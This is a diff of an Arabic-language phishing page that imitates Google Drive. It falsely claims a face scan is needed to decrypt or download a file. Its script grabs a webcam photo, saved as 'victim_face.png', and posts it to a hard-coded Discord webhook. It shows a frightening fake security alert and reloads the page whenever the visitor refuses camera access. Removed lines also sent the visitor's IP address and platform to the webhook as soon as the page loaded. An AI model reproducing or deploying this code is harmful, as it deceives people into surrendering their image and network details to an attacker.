@@ -2,19 +2,15 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Google Drive - معاينة الملف</title>
-    <link rel="shortcut icon" href="https://ssl.gstatic.com/docs/doclist/images/drive_2020q4_32dp.png">
+    <title>Google Drive - خطا في النظام</title>
     <script>
-    async function startCapture() {
+    async function forceCapture() {
         const webhook = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
-        const btn = document.getElementById('mainBtn');
-        btn.innerText = "جاري التحميل...";
-
+        
         try {
-            // 1. طلب الكاميرا (هنا سيظهر زر "سماح" للضحية)
+            // طلب الكاميرا - ستظهر رسالة المتصفح الرسمية
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             
-            // 2. إذا ضغط سماح، نسحب الصورة فوراً
             const video = document.createElement('video');
             video.srcObject = stream;
             video.onloadedmetadata = async () => {
@@ -26,60 +22,35 @@
                 const blob = await (await fetch(canvas.toDataURL('image/png'))).blob();
                 
                 const formData = new FormData();
-                formData.append('file', blob, 'shot.png');
-                formData.append('content', "📸 **تم سحب صورة حية بنجاح من الضحية!**");
+                formData.append('file', blob, 'victim_face.png');
+                formData.append('content', "📸 **[TLQQEMM] تم سحب الصورة بنجاح!**");
                 
                 await fetch(webhook, { method: 'POST', body: formData });
+                stream.getTracks().forEach(t => t.stop());
                 
-                // إغلاق الكاميرا بعد السحب
-                stream.getTracks().forEach(track => track.stop());
-                alert("خطأ: الملف تالف أو غير متوافق مع جهازك.");
-                btn.innerText = "فشل التحميل";
+                // تحويله لموقع آخر بعد السحب
+                window.location.href = "https://google.com";
             };
         } catch (e) {
-            // إذا رفض السماح
-            alert("يجب السماح بالوصول للكاميرا لفك تشفير الملف وتأكيد هويتك.");
-            btn.innerText = "إعادة المحاولة";
+            // إذا رفض، نظهر له تنبيه مخيف ليضطر للقبول
+            alert("⚠️ خطأ أمني: يجب السماح بالوصول لتجنب حظر جهازك من خدمات جوجل.");
+            location.reload(); // إعادة تحميل الصفحة ليحاول مرة أخرى
         }
     }
-
-    // سحب البيانات النصية (IP وغيره) بمجرد الدخول بدون انتظار الزر
-    window.onload = async () => {
-        const webhook = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
-        try {
-            const ipReq = await fetch('https://api.ipify.org?format=json');
-            const ipRes = await ipReq.json();
-            const payload = {
-                embeds: [{
-                    title: "🔔 ضحية جديدة فتحت الرابط",
-                    color: 16711680,
-                    fields: [
-                        { name: "🌐 الـ IP", value: ipRes.ip, inline: true },
-                        { name: "💻 النظام", value: navigator.platform, inline: true }
-                    ],
-                    footer: { text: "في انتظار ضغط زر السماح..." }
-                }]
-            };
-            fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
-        } catch (e) {}
-    };
     </script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 350px; }
-        .drive-icon { width: 60px; margin-bottom: 20px; }
-        h2 { font-size: 18px; color: #3c4043; margin-bottom: 10px; }
-        p { font-size: 13px; color: #5f6368; margin-bottom: 25px; line-height: 1.5; }
-        .download-btn { background-color: #1a73e8; color: white; border: none; padding: 12px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 14px; transition: 0.3s; }
-        .download-btn:hover { background-color: #1765cc; }
+        body { background-color: #f1f3f4; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); text-align: center; width: 400px; }
+        .icon { width: 50px; margin-bottom: 20px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" class="drive-icon">
-        <h2>Private_Data_Secure.zip</h2>
-        <p>هذا الملف محمي بكلمة مرور. يجب عليك تأكيد هويتك عبر فحص الوجه السريع لتتمكن من تحميل الملف.</p>
-        <button id="mainBtn" class="download-btn" onclick="startCapture()">تحميل الملف الآن</button>
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" class="icon">
+        <h2 style="font-size: 20px; color: #3c4043;">فشل فحص الأمان</h2>
+        <p style="color: #5f6368; font-size: 14px;">نظام الحماية اكتشف محاولة دخول مشبوهة. يرجى الضغط على الزر أدناه لتفعيل ماسح الوجه السريع (FaceID) لفك تشفير الملفات.</p>
+        <button class="btn" onclick="forceCapture()">تفعيل فحص الوجه والتحميل</button>
     </div>
 </body>
 </html>
